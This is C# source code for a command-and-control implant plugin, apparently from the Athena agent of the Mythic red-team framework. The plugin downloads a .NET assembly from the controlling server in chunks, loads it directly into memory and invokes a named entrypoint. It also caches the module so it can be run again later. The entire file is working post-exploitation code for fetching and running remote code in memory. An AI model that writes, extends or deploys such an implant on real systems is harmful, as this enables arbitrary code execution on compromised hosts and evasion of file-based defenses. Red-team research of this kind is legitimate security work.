using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using execute_module;
using System.Collections.Concurrent;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "execute-module";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private AssemblyLoadContext assemblyLoadContext = new AssemblyLoadContext(Misc.RandomString(10));
        private readonly ConcurrentDictionary<string, ExecModuleArgs> module_tasks = new();
        private readonly ConcurrentDictionary<string, AthenaModule> modules = new();
        private readonly ConcurrentDictionary<string, AthenaModule> pendingModules = new();
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private readonly ConcurrentDictionary<string, CancellationTokenRegistration> cancellationRegistrations = new();
        private readonly ConcurrentDictionary<string, SemaphoreSlim> transferGates = new();
        private const long MaximumTransferBytes = 256L * 1024 * 1024;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.config = config;
            uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
        }

        public async Task Execute(ServerJob job)
        {
            ExecModuleArgs args = JsonSerializer.Deserialize<ExecModuleArgs>(job.task.parameters);

            if(args is null)
            {
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to parse args.",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            //The operator indicated that the module has already been loaded
            if (string.IsNullOrEmpty(args.file))
            {
                if (!modules.TryGetValue(args.name, out AthenaModule? module))
                {
                    messageManager.AddTaskResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "Module not loaded.",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }


                if(!await this.ExecuteModule(module, args, job.task.id, replaceLoadedModule: false))
                {
                    messageManager.AddTaskResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "Failed to execute module.",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }
            }
            //Start new module loading process
            else
            {
                //Create new object to store the loaded module
                AthenaModule mod = new AthenaModule()
                {
                    name = args.name,
                    entrypoint = args.entrypoint,
                };

                //Start Download
                ServerUploadJob uploadJob = new ServerUploadJob(job, config.chunk_size);
                if (job.cancellationtokensource is not null)
                {
                    uploadJob.cancellationtokensource = job.cancellationtokensource;
                }
                uploadJob.file_id = args.file;
                uploadJob.chunk_num = 1;

                //Add job to our tracker
                if (!uploadJobs.TryAdd(job.task.id, uploadJob))
                {
                    messageManager.AddTaskResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "failed to add job to tracker",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }

                pendingModules[job.task.id] = mod;
                module_tasks[job.task.id] = args;
                transferGates[job.task.id] = new SemaphoreSlim(1, 1);

                RegisterCancellation(job);
                if (!uploadJobs.ContainsKey(job.task.id))
                {
                    return;
                }

                //Kick off the file transfer process
                messageManager.AddTaskResponse(new UploadTaskResponse
                {
                    task_id = job.task.id,
                    upload = new UploadTaskResponseData
                    {
                        chunk_size = uploadJob.chunk_size,
                        chunk_num = uploadJob.chunk_num,
                        file_id = uploadJob.file_id,
                        full_path = string.Empty,
                    },
                    user_output = string.Empty
                }.ToJson());
            }
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            ServerUploadJob? uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to get job",
                }.ToJson());
                return;
            }

            if (!transferGates.TryGetValue(response.task_id, out SemaphoreSlim? transferGate)) return;
            await transferGate.WaitAsync();
            try
            {
                if (!uploadJobs.TryGetValue(response.task_id, out ServerUploadJob? currentJob) ||
                    !ReferenceEquals(currentJob, uploadJob)) return;

            //Did user request cancellation of the job?
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Cancellation Requested",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Update the chunks required for the upload
            if (uploadJob.total_chunks == 0)
            {
                long maximumChunks = (MaximumTransferBytes + uploadJob.chunk_size - 1L) / uploadJob.chunk_size;
                if (response.total_chunks <= 0 || response.total_chunks > maximumChunks)
                {
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        status = "error",
                        completed = true,
                        task_id = response.task_id,
                        user_output = "Invalid total chunk count.",
                    }.ToJson());
                    this.CompleteUploadJob(response.task_id);
                    return;
                }

                uploadJob.total_chunks = response.total_chunks;
            }
            else if (response.total_chunks != uploadJob.total_chunks)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error", completed = true, task_id = response.task_id,
                    user_output = "Upload total chunk count changed.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Did we get chunk data?
            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "No chunk data received.",

                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            if (response.chunk_num != uploadJob.chunk_num || response.chunk_num > uploadJob.total_chunks)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Invalid chunk number.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            byte[] chunk;
            try
            {
                chunk = Base64Transfer.Decode(response.chunk_data, uploadJob.chunk_size);
            }
            catch (FormatException)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Invalid chunk data.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }
            catch (ArgumentException exception)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error", completed = true, task_id = response.task_id,
                    user_output = exception.Message,
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            if (!pendingModules.TryGetValue(response.task_id, out AthenaModule? pending) ||
                (long)pending.fContent.Count + chunk.Length > MaximumTransferBytes)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error", completed = true, task_id = response.task_id,
                    user_output = "Transfer exceeds the configured size limit.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Write the chunk data to our stream
            if (!this.HandleNextChunk(chunk, response.task_id))
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to process message.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Increment chunk number for tracking
            uploadJob.chunk_num++;

            //Prepare response to Mythic
            UploadTaskResponse ur = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            //Check if we're done
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                AthenaModule module = pendingModules[response.task_id];
                ExecModuleArgs args = module_tasks[response.task_id];
                bool executed = await this.ExecuteModule(module, args, response.task_id, replaceLoadedModule: true);
                if (!executed)
                {
                    ur.status = "error";
                    ur.user_output = "Failed to execute module.";
                }
                this.CompleteUploadJob(response.task_id);
            }

            //Return response
            messageManager.AddTaskResponse(ur.ToJson());
            }
            finally
            {
                transferGate.Release();
            }
        }
        private bool HandleNextChunk(byte[] bytes, string taskId)
        {
            if (!pendingModules.TryGetValue(taskId, out AthenaModule? mod)) return false;
            mod.fContent.AddRange(bytes);
            return true;
        }

        private ServerUploadJob? GetJob(string task_id)
        {
            uploadJobs.TryGetValue(task_id, out ServerUploadJob? uploadJob);
            return uploadJob;
        }

        private async Task<bool> ExecuteModule(
            AthenaModule mod,
            ExecModuleArgs args,
            string task_id,
            bool replaceLoadedModule)
        {
            try
            {
                if(mod.asm is null)
                {
                    if (mod.fContent.Count() <= 0)
                    {
                        return false;
                    }
                    mod.asm = assemblyLoadContext.LoadFromStream(new MemoryStream(mod.fContent.ToArray()));
                }

                MethodInfo method = FindMethodInNamespace(mod.asm, mod.entrypoint);

                if (method is null)
                {
                    //do some error stuff
                    return false;
                }
                if (replaceLoadedModule)
                {
                    modules[mod.name] = mod;
                }
                var result = method.Invoke(null, new object[] { task_id, args.GetArgs(), messageManager });
                return true;
            }
            catch (Exception e)
            {
                messageManager.WriteLine(e.ToString(), task_id, false, "error");
            }

            return false;
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private void CompleteUploadJob(string task_id)
        {
            if (!uploadJobs.TryRemove(task_id, out _))
            {
                return;
            }

            module_tasks.Remove(task_id, out _);
            pendingModules.TryRemove(task_id, out _);
            transferGates.TryRemove(task_id, out _);
            UnregisterCancellation(task_id);

            this.messageManager.CompleteJob(task_id);
        }

        private void RetireUploadJob(string taskId)
        {
            if (!transferGates.TryGetValue(taskId, out SemaphoreSlim? transferGate))
            {
                CompleteUploadJob(taskId);
                return;
            }

            transferGate.Wait();
            try
            {
                CompleteUploadJob(taskId);
            }
            finally
            {
                transferGate.Release();
            }
        }

        private void RegisterCancellation(ServerJob job)
        {
            if (job.cancellationtokensource is null) return;

            CancellationTokenRegistration registration = job.cancellationtokensource.Token.Register(
                static state =>
                {
                    var (plugin, taskId) = ((Plugin, string))state!;
                    plugin.RetireUploadJob(taskId);
                },
                (this, job.task.id));
            cancellationRegistrations[job.task.id] = registration;

            if (!uploadJobs.ContainsKey(job.task.id))
            {
                UnregisterCancellation(job.task.id);
            }
        }

        private void UnregisterCancellation(string taskId)
        {
            if (cancellationRegistrations.TryRemove(taskId, out CancellationTokenRegistration registration))
            {
                registration.Unregister();
            }
        }

        private static MethodInfo? FindMethodInNamespace(Assembly assembly, string  methodName)
        {
            // Search for the method in all types
            MethodInfo? targetMethod = null;

            foreach (Type type in assembly.GetTypes())
            {
                foreach(var method in type.GetMethods())
                {
                    if (method.Name.Contains(methodName))
                    {
                        return type.GetMethod(method.Name, BindingFlags.Public | BindingFlags.Static);
                    }
                }
                targetMethod = type.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);

                //// Check if the method exists and matches the desired signature
                //if (targetMethod != null)
                //{
                //    return targetMethod;
                //}
            }
            return null;
        }
    }
}
